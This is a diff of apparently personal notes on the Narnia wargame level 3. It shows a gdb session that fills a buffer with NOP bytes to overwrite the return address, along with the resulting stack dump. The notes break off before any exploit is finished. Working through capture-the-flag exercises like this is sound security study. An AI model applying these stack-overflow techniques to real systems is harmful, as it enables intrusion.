@@ -1,4 +1,4 @@
-#narnia level 3:
+narnia level 3:
 
 no overflow, but full buffer: 
 /tmp/UUUUUUUUUUUUUUUUUUUUUU.txt
@@ -29,5 +29,23 @@ note where the registers are located.
 ebp @ 0x00000000
 esp @ 0xffffd680
 eip @ 0xf7e2a286
+
+**attemping to alter return address by buffer overflowing brute force**
+Starting program: /narnia/narnia3 $(python -c 'print "\x90"*60')
+
+Breakpoint 1, 0x0804855f in main ()
+(gdb) x/28x $esp
+0xffffd648:     0xffffd670      0xffffd871      0xffffffff      0xf7fc5000
+0xffffd658:     0xf7e1ee18      0xf7fd2e28      0xf7fc5000      0xffffd744
+0xffffd668:     0xf7ffcd00      0x00200000      0x90909090      0x90909090
+0xffffd678:     0x90909090      0x90909090      0x90909090      0x90909090
+0xffffd688:     0x90909090      0x90909090      0x90909090      0x90909090
+0xffffd698:     0x90909090      0x90909090      0x90909090      0x90909090
+0xffffd6a8:     0x90909090      0xf7e2a200      0x00000002      0xffffd744
+(gdb)
+
+nop slide to $eip register. (0x90)
+
+**attempt to alter return address 2**
 
 
